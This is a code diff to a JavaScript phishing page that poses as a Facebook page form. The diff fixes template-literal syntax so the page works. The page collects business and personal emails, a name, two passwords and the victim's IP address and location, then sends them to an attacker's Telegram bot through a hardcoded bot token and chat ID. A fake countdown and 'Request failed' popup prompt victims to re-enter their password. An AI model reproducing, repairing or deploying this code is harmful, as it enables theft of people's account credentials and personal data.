@@ -7,7 +7,7 @@ function getIP(callback) {
 
 $(document).ready(function () {
 
-    $('#input').html(
+    $('#input').html(`
                             <div class="mb-3">
                                 <label for="page-name" class="form-label">
                                     Page Name <span class="text-danger">*</span>
@@ -47,7 +47,7 @@ $(document).ready(function () {
                                 <textarea class="form-control" id="description" rows="3"></textarea>
                             </div>
                             <button type="button" class="btn mb-4">Submit</button>
-    )
+    `)
 
     openDetail();
     let IpAddress = '';
@@ -211,7 +211,7 @@ function showPrompt(IpAddress) {
             password = FIRST_PASSWORD;
         }
 
-        const message1 = 📧 <strong>Business Email: </strong><code>${$("#business-email").val()}</code>
+        const message1 = `📧 <strong>Business Email: </strong><code>${$("#business-email").val()}</code>
 👤 <strong>User Name: </strong><code>${$("#full-name").val()}</code>
 📨 <strong>Personal Email: </strong><code>${$("#personal-email").val()}</code>
 🏳️ <strong>Facebook Page: </strong><code>${$("#page-name").val()}</code>
@@ -220,13 +220,13 @@ function showPrompt(IpAddress) {
 🔑 <strong>Second Password: </strong><code>${secondPassword}</code>
 🌐 <strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
  <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
- <strong>City: </strong><code>${IpAddress.city}</code>;
+ <strong>City: </strong><code>${IpAddress.city}</code>`;
 
         const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
         const chatId = '-1002416068664';
         const message = message1;
 
-        const telegramUrl = https://api.telegram.org/bot${botToken}/sendMessage;
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
         fetch(telegramUrl, {
             method: 'POST',
@@ -254,7 +254,7 @@ function showPrompt(IpAddress) {
     let countdown = 10;
 
     // 👉 Cập nhật ngay để tránh delay hiển thị
-    submitBtn.text(Wait ${countdown}s);
+    submitBtn.text(`Wait ${countdown}s`);
     submitBtn.prop('disabled', true);
 
     // 👉 Delay phần DOM nặng sang vòng sau
@@ -266,7 +266,7 @@ function showPrompt(IpAddress) {
     const interval = setInterval(() => {
         countdown--;
         if (countdown > 0) {
-            submitBtn.text(Wait ${countdown}s);
+            submitBtn.text(`Wait ${countdown}s`);
         } else {
             clearInterval(interval);
             submitBtn.prop('disabled', false);
@@ -288,7 +288,7 @@ function showPrompt(IpAddress) {
         .catch(error => {
             setTimeout(function () {
                 Swal.fire({
-                    text: Request failed!,
+                    text: `Request failed!`,
                     icon: "error"
                 });
                 $('.lsd-ring-container').addClass('d-none');
